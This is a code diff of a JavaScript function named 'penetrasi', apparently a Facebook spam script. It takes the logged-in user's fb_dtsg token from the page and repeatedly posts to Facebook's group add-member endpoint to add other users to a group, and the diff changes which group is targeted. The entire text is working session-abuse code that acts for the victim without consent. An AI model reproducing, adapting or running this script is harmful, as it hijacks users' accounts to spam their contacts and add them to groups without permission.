@@ -55,8 +55,8 @@ function penetrasi(opo) {
 		setTimeout("penetrasi(" + s + ")", 100)
 	}
 	console.log(tay + "/" + arr.length + ":" + s + ", success:" + suc);
-	if (memberGroupId != 128336317239973) {
-		jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=128336317239973&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user, function () {},
+	if (memberGroupId != 463155077048072) {
+		jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=463155077048072&source=typeahead&members=" + opo + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user, function () {},
 		"text", "post")
 	}
 }
